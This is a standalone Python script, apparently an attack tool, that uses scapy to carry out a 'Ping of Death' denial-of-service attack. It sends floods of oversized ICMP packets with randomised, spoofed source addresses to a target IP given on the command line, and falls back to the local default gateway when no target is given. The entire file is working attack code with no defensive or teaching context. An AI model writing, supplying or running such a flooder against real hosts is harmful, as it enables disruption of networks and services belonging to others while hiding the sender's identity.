#!/usr/bin/python

from scapy.all import *
import os
import sys
import netifaces

MESSAGE = "S"
NUMBER_PACKETS = 5

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def get_gateway_ip():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        return default_gateway
    except (KeyError, IndexError):
        print("Could not retrieve gateway IP.")
        return None

def ping_of_death(target_ip):
    for i in range(NUMBER_PACKETS):
        print(f"Sending packet number: {i}")
        s_addr = RandIP()
        ping_packet = IP(src=s_addr, dst=target_ip)/ICMP()/(MESSAGE * 60000)
        send(NUMBER_PACKETS*ping_packet)

def main():
    check_root()
    victim_ip = sys.argv[1] if len(sys.argv) > 1 else get_gateway_ip()
    
    if not victim_ip:
        print("No valid target IP found.")
        sys.exit(1)

    print("Starting Ping of Death")
    print("Target IP:", victim_ip)
    
    try:
        print("Press CTRL+C to stop.")
        ping_of_death(victim_ip)
    except KeyboardInterrupt:
        print("\nPing of Death stopped.")

if __name__ == "__main__":
    main()